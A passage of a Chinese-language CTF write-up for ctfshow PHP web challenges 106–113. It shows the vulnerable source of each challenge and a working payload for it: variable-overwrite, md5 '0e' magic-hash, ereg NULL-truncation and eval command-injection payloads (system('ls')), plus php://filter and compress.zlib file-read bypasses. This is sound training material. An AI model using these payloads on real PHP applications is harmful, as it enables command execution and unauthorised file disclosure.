class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>知识点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$$的变量覆盖</span><br><span class="line"></span><br><span class="line">GET和POST获得的参数是以键值对的形式存储的</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析：</p><p>第一个foreach是GET的键不能是error，第二个是POST的值不能是flag</p><p>题目一共有三个变量 $error $suces $flag我们只要令其中任意一个的值为flag，都是可以通过die或者直接echo输出的。</p><p>通过die($error)输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload：</span><br><span class="line">GET:?suces=flag</span><br><span class="line">POST:error=suces</span><br></pre></td></tr></table></figure><p>分析GET请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    if($key===&#x27;error&#x27;)&#123;</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line">//当传入suces=flag时，实际上执行的是$suces=$flag</span><br><span class="line">//即把flag赋值给了suces变量</span><br></pre></td></tr></table></figure><p>分析：POST请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">foreach($_POST as $key =&gt; $value)&#123;</span><br><span class="line">    if($value===&#x27;flag&#x27;)&#123;</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//传入error=suces,得到$error=$suces=$flag</span><br><span class="line">//即成功把flag的值赋给了error变量</span><br></pre></td></tr></table></figure><h1 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">       parse_str(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$v2</span>[<span class="string">&#x27;flag&#x27;</span>]==md5(<span class="variable">$v3</span>))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://php.p2hp.com/manual/zh/function.parse-str.php">parse_str函数</a></p><p>第二个参数：可选。规定存储变量的数组名称。该参数指示变量存储到数组中。</p><p>利用md5碰撞：使得v1中的flag=0，然后v3=0(md5(QNKCDZO)=0e…)，以0e开头的会被科学计数法认为0</p><p>payload：<code>vl=flag=0，v3=QNKCDZO</code></p><p>md5弱碰撞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">0e开头的md5和原值：</span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="built_in">error</span></span><br></pre></td></tr></table></figure><p><a href="https://php.p2hp.com/manual/zh/function.strrev.php">strrev函数</a></p><p><a href="https://php.p2hp.com/manual/zh/function.intval.php">intval函数</a></p><p>ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p><p><a href="https://blog.csdn.net/qq_25987491/article/details/79952393">php中ereg函数的截断漏洞</a></p><p>0x36d=877，因为会被反转所以需要778来提前反转，同时需要截断处理，所以<code>c=d%00778</code>经过反转后取整就是877</p><h1 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; preg_match(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP异常处理 、嵌套执行</span><br><span class="line">通过异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果（如果存在返回）</span><br><span class="line">只要是变量后面紧跟着（），那么对这个变量进行函数调用。例如$a = &#x27;phpinfo&#x27;; $a(）即调用phpinfo（）</span><br></pre></td></tr></table></figure><p>因为只要有字母就行，所以利用PHP已有的类闭合一下(预防意外的报错导致程序无法正常执行)，然后构造命令执行即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?v1=Exception();system(&quot;ls&quot;);//&amp;v2=a</span><br><span class="line">?v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)</span><br><span class="line">?v1=ReflectionClass(&quot;PDO&quot;);system(&quot;ls&quot;);//&amp;v2=a</span><br></pre></td></tr></table></figure><p><a href="http://blog.uiste.com/2015/20151018-1.html">反射 | PDO</a></p><h1 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>FilesystemIterator获取目录文件<a href="http://phpff.com/filesystemiterator">FilesystemIterator</a></p><p>getcwd()函数取得当前工作目录<a href="https://www.runoob.com/php/func-directory-getcwd.html">getcwd()函数</a></p><p>构造playload：</p><p><code>v1=FilesystemIterator&amp;v2=getcwd</code></p><p>得到当前目录的第一个文件名字：fl36dga.txt，然后访问即可，缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。因为FilesystemIterator一次只会得到一个文件名。</p><h1 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">     </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    var_dump(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            getFlag(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">php超全局变量$GLOBALS的使用</span><br><span class="line"></span><br><span class="line">GLOABALS 引用全局作用域中可用的全部变量，一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</span><br><span class="line"></span><br><span class="line">PHP生命周期中，定义在函数体外部的所谓全局变量，函数内部是不能直接获得的。即外部变量，函数内部是无法访问的，除非给函数传参数</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line"></span><br><span class="line">    $a=123;</span><br><span class="line">    $b=456;</span><br><span class="line">    var_dump($GLOBALS);</span><br><span class="line"></span><br><span class="line">返回内容较多就不一一列出了。我们只看最后两条，发现我们自行定义的变量会被输出</span><br><span class="line"></span><br><span class="line">  [&quot;a&quot;]=&gt;</span><br><span class="line"></span><br><span class="line">  int(123)</span><br><span class="line"></span><br><span class="line">  [&quot;b&quot;]=&gt;</span><br><span class="line"></span><br><span class="line">  int(456)</span><br></pre></td></tr></table></figure><p>分析：</p><p>所以对于该题，只要把$GLOBALS赋值给v2，然后v2再赋值给v1,经过getFlag之后，eval($ctfshow=&amp;$GLOBALS;)，即将变量ctfshow指向变量GLOBALS的地址即两个等价，实现var_dump($ctfshow)=var_dump($GLOBALS)的操作，即可将全部变量输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h1 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>知识点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">is_file  判断给定文件名是否为一个正常的文件，filename为文件的路径。</span><br><span class="line">//is_file函数可以使用包装器伪协议来绕过，当is_file的参数为伪协议时，返回值为false</span><br><span class="line">//不影响file_get_contents highlight_file</span><br></pre></td></tr></table></figure><p>分析：</p><p>我们的目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">可以直接用不带任何过滤器的filter伪协议</span><br><span class="line">?file=php://filter/resource=flag.php</span><br><span class="line"> </span><br><span class="line">也可以用一些没有过滤掉的编码方式和转换方式</span><br><span class="line">?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">?file=compress.zlib://flag.php</span><br><span class="line">?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">    highlight_file(filter(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>方法1:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure><p>方法2:</p><p>知识点：</p><pre><code>在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容。多次重复后绕过is_file。大佬的解释是:超过20次软连接后就可以绕过is_file这里使用的是PHP最新版的小Trick，require_once包含的软链接层数较多时once 的 hash 匹配会直接失效造成重复包含（目录溢出）php源码分析 require_once 绕过不能重复包含文件的限制</code></pre><p>方法：</p><figure class="highlight 